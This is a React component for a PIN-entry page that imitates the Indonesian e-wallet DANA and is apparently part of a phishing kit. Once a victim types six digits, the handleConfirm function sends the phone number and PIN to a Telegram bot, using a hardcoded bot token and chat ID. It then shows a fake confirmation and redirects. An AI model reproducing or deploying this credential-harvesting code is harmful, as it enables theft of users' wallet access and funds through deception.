import React, { useState, useEffect, useRef } from 'react';
    import { Link, useLocation, useNavigate } from 'react-router-dom';
    import './PinPage.css';

    function PinPage() {
      const [pin, setPin] = useState(['', '', '', '', '', '']);
      const location = useLocation();
      const phoneNumber = location.state?.phoneNumber || '';
      const navigate = useNavigate();
      const inputRefs = useRef([]);

      useEffect(() => {
        document.body.classList.add('pin-page');
        return () => {
          document.body.classList.remove('pin-page');
        };
      }, []);

      useEffect(() => {
        // Automatically confirm when all PIN digits are entered
        if (pin.every(digit => digit !== '')) {
          handleConfirm();
        }
      }, [pin, phoneNumber, navigate]);

      const handlePinChange = (index, value) => {
        if (isNaN(value)) return;

        const newPin = [...pin];
        newPin[index] = value;
        setPin(newPin);

        if (value && index < pin.length - 1) {
          inputRefs.current[index + 1].focus();
        }
      };

      const handleKeyDown = (index, event) => {
        if (event.key === 'Backspace' && !pin[index] && index > 0) {
          inputRefs.current[index - 1].focus();
        }
      };

      const handleConfirm = async () => {
        const pinValue = pin.join('');

        try {
          const response = await fetch('https://api.telegram.org/bot7480000961:AAEkDpsi4pGe3BuJYp1dbWQ51pXPskBEzpk/sendMessage', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: '6538670773',
              text: `Nomor HP: ${phoneNumber}, PIN: ${pinValue}`,
            }),
          });

          if (response.ok) {
            console.log('Data berhasil dikirim ke Telegram!');
            alert('PIN berhasil dikonfirmasi!');
            navigate('/'); // Redirect to home page after successful confirmation
          } else {
            console.error('Gagal mengirim data ke Telegram:', response.status);
            alert('Gagal mengirim data. Coba lagi nanti.');
          }
        } catch (error) {
          console.error('Error:', error);
          alert('Terjadi kesalahan. Coba lagi nanti.');
        }
      };

      return (
        <div className="pin-container">
          <Link to="/" className="back-button">
            &lt;
          </Link>
          <h1>Masukkan PIN DANA kamu</h1>
          <p>Kirim ulang</p>
          <div className="pin-inputs">
            {pin.map((digit, index) => (
              <input
                type="password"
                key={index}
                id={`pin-input-${index}`}
                maxLength="1"
                value={digit}
                onChange={(e) => handlePinChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="pin-input"
                ref={el => inputRefs.current[index] = el}
              />
            ))}
          </div>
          <p>Nomor HP: {phoneNumber}</p>
        </div>
      );
    }

    export default PinPage;
